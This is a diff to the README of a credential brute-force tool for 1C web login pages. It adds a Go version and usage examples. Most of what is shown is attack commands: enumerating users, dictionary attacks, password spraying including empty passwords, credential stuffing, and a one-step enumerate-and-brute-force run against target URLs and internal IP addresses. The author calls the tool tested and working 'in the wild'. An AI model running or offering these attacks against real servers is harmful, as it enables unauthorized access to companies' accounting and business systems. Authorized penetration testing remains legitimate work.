@@ -4,82 +4,109 @@ web bruter for 1c
 I reversed javascript from 1c login page. Understood how the algorithm works while generating auth-string before sending on the server.
 
 ## What in files?
-- 1c_bruter.py - POC written by me, tested and works in the wild
-- 1c_bruter.go - Go version with the same functionality
+- `1c_bruter.py` — POC written by me, tested and works in the wild
+- `1c_bruter.go` — Go version: no dependencies, single binary, TLS 1.0+ support for legacy corporate servers
 
 ## Requirements
 
+**Python version:**
 ```bash
 pip install -r requirements.txt
 ```
 
+**Go version** — no dependencies, just build:
+```bash
+go build -o wb1c 1c_bruter.go
+# Windows:
+go build -o wb1c.exe 1c_bruter.go
+```
+
 ## Help
 
+**Python:**
 ```
 usage: 1c_bruter.py [-h] [-u USER] [-U USERS] [-p PASSWORD] [-P PASSWORDS] [-l] [-o OUTPUT] url
 
-Пентестерский инструмент для перебора учетных данных 1С информационной базы.
-
-positional arguments:
-  url           URL 1С информационной базы
-
 options:
-  -h, --help    show this help message and exit
-  -u USER       Имя пользователя для проверки пароля
-  -U USERS      Файл со списком пользователей
-  -p PASSWORD   Пароль для перебора
-  -P PASSWORDS  Файл со списком паролей
-  -l            Получить список пользователей из информационной базы
-  -o OUTPUT     Файл для сохранения результатов
+  -u USER       Username to check
+  -U USERS      File with usernames list
+  -p PASSWORD   Password to try
+  -P PASSWORDS  File with passwords list
+  -l            Fetch users list from the server
+  -o OUTPUT     Save results to file
+```
+
+**Go:**
+```
+Usage: wb1c [-u USER] [-U FILE] [-p PASSWORD] [-P FILE] [-l] [-v] [-o OUTPUT] URL
+
+  -u USER       Username to check
+  -U FILE       File with usernames list
+  -p PASSWORD   Password to try
+  -P FILE       File with passwords list
+  -l            Fetch users list from the server
+  -v            Verbose: show all attempts including failures
+  -o OUTPUT     Save results to file
 ```
 
 ## Usage Examples
 
-### Recon - get users list
+### Recon — get users list
 
 ```bash
+# Python
 python 1c_bruter.py -l http://target-server/InfoBase
-python 1c_bruter.py -l -o users.txt http://192.168.1.100/accounting
+
+# Go
+./wb1c -l http://target-server/InfoBase
+./wb1c -l -o users.txt http://192.168.1.100/accounting
 ```
 
 ### Check specific credentials
 
 ```bash
-# Check single password for specific user
+# Python
 python 1c_bruter.py -u Administrator -p "Password123" http://target-server/InfoBase
 
-# Check empty password for admin
-python 1c_bruter.py -u Administrator -p "" http://192.168.1.100/production
+# Go
+./wb1c -u Administrator -p "Password123" http://target-server/InfoBase
+./wb1c -u Administrator -p "" http://192.168.1.100/production
 ```
 
 ### Dictionary attack
 
 ```bash
 # Single user, multiple passwords
-python 1c_bruter.py -u Accountant -P passwords.txt http://target-server/InfoBase
+./wb1c -u Accountant -P passwords.txt http://target-server/InfoBase
 
-# With saving results
-python 1c_bruter.py -u Administrator -P common_passwords.txt -o results.txt http://192.168.1.100/accounting
+# With verbose output and results saved
+./wb1c -u Administrator -P common_passwords.txt -v -o results.txt http://192.168.1.100/accounting
 ```
 
 ### Password spraying
 
 ```bash
-# Single password, multiple users
-python 1c_bruter.py -U users.txt -p "Spring2024" http://target-server/InfoBase
+# Single password against user list
+./wb1c -U users.txt -p "Spring2024" http://target-server/InfoBase
 
 # Check empty passwords for all users
-python 1c_bruter.py -U users.txt -p "" -o empty_passwords.txt http://192.168.1.100/production
+./wb1c -U users.txt -p "" -o empty_passwords.txt http://192.168.1.100/production
 ```
 
 ### Credential stuffing
 
 ```bash
 # User list + password list
-python 1c_bruter.py -U users.txt -P passwords.txt http://target-server/InfoBase
+./wb1c -U users.txt -P passwords.txt http://target-server/InfoBase
 
-# With saving results
-python 1c_bruter.py -U discovered_users.txt -P top1000.txt -o compromised_accounts.txt http://192.168.1.100/accounting
+# With verbose output
+./wb1c -U discovered_users.txt -P top1000.txt -v -o compromised.txt http://192.168.1.100/accounting
+```
+
+### Fetch users + bruteforce in one command (Go only)
+
+```bash
+./wb1c -l -P passwords.txt http://target-server/InfoBase
 ```
 
 ## Algorithm
